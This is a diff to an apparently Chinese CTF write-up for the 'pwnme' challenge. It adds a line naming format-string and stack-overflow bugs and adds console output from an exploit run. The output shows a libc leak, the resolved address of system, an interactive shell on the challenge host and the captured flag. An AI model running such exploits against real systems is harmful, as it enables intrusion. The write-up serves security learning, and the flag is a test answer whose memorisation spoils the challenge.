@@ -14,14 +14,11 @@ nc 106.75.2.53 10006
 
 ## 主要知识点
 ---
-
+格式化字符串漏洞 栈溢出
 
 ## 题目分值
 ---
 50
-
-## 部署方式
----
 
 
 ## 解题思路
@@ -126,6 +123,33 @@ io.interactive()
 ```
 
 ![](images/ctf-2021-06-10-14-56-36.png)
+
+
+```
+python exp.py              
+
+[+] Opening connection to 106.75.2.53 on port 10006: Done
+[*] '/home/sea/ICHUNQIU/ichunqiu_50_pwnme/result/pwnme'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Loading from '/home/sea/ICHUNQIU/ichunqiu_50_pwnme/result/pwnme': 0x7f730d1c5168
+[+] Resolving 'system' in 'libc.so': 0x7f730d1c5168
+[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.
+[*] Build ID not found at offset 0x174
+[*] .gnu.hash/.hash, .strtab and .symtab offsets
+[*] Found DT_GNU_HASH at 0x7f730cf97c00
+[*] Found DT_STRTAB at 0x7f730cf97c10
+[*] Found DT_SYMTAB at 0x7f730cf97c20
+[*] .gnu.hash parms
+[*] hash chain index
+[*] hash chain
+[*] system_addr:0x7f730cc19390
+[*] Switching to interactive mode
+flag{b6401733-a29b-425a-bd8a-3927345c3505}
+```
 
 ## 参考
 ---
